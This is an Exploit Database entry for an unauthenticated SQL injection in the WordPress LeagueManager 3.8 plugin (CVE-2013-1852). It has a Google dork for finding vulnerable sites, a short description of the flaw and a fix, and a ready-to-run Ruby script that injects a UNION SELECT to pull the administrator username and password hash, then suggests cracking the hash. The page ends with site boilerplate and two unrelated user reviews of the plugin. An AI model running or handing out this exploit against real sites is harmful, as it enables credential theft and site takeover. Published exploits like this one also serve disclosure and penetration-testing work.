# Exploit Title: WordPress LeagueManager Plugin v3.8 SQL Injection
# Google Dork: inurl:"/wp-content/plugins/leaguemanager/"
# Date: 13/03/13
# Exploit Author: Joshua Reynolds
# Vendor Homepage: http://wordpress.org/extend/plugins/leaguemanager/
# Software Link: http://downloads.wordpress.org/plugin/leaguemanager.3.8.zip
# Version: 3.8
# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
# CVE: CVE-2013-1852
#-----------------------------------------------------------------------------------------
#Description:
#
#An SQL Injection vulnerability exists in the league_id parameter of a function call made
#by the leaguemanager_export page. This request is processed within the leaguemanager.php:
#
#if ( isset($_POST['leaguemanager_export']))
#               $lmLoader->adminPanel->export($_POST['league_id'], $_POST['mode']);
#
#Which does not sanitize of SQL injection, and is passed to the admin/admin.php page
#into the export( $league_id, $mode ) function which also does not sanitize for SQL injection
#when making this call: $this->league = $leaguemanager->getLeague($league_id);
#The information is then echoed to a CSV file that is then provided.
#
#Since no authentication is required when making a POST request to this page,
#i.e /wp-admin/admin.php?page=leaguemanager-export the request can be made with no established
#session.
#
#Fix:
#
#A possible fix for this would be to cast the league_id to an integer during any
#of the function calls. The following changes can be made in the leaguemanager.php file:
#$lmLoader->adminPanel->export((int)$_POST['league_id'], $_POST['mode']);
#
#These functions should also not be available to public requests, and thus session handling
#should also be checked prior to the requests being processed within the admin section.
#
#The responsible disclosure processes were distorted by the fact that the author no longer
#supports his well established plugin, and there are currently no maintainers. After
#e-mailing the folks over at plugins@wordpress.org they've decided to discontinue the plugin
#and not patch the vulnerability.
#
#The following ruby exploit will retrieve the administrator username and the salted
#password hash from a given site with the plugin installed:
#------------------------------------------------------------------------------------------
#Exploit:

require 'net/http'
require 'uri'

if ARGV.length == 2
	post_params = {
		'league_id' => '7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,'\
		'9,10,11,12,13,user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--',
		'mode' => 'teams',
		'leaguemanager_export' => 'Download+File'
	}

	target_url = ARGV[0] + ARGV[1] + "/wp-admin/admin.php?page=leaguemanager-export"

	begin
		resp = Net::HTTP.post_form(URI.parse(target_url), post_params)
	rescue
		puts "Invalid URL..."
	end

	if resp.nil?
		print_error "No response received..."

	elsif resp.code != "200"
		puts "Page doesn't exist!"
	else
		admin_login = resp.body.scan(/21\t(.*)\t2.*0\t(.*)\t15/)

		if(admin_login.length > 0)
			puts "Username: #{admin_login[0][0]}"
			puts "Hash: #{admin_login[0][1]}"
			puts "\nNow go crack that with Hashcat :)"
		else
			puts "Username and hash not received. Maybe it's patched?"
		end
	end
else
	puts "Usage: ruby LeagueManagerSQLI.rb \"http://example.com\" \"/wordpress\""
end

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

You install it, you get no errors, you add a season, you add a team and then it does not allow you to add another team!! It says ‘You need at least one season’ then you refresh you try to add again a team, it says ‘Team added’ but it does not add it. Thank you for wasting our time.

I use it mainly for soccer, has almost all the features needed, and you can develop on it based on your needs. I appreciate the development and updates happening to the plugin.
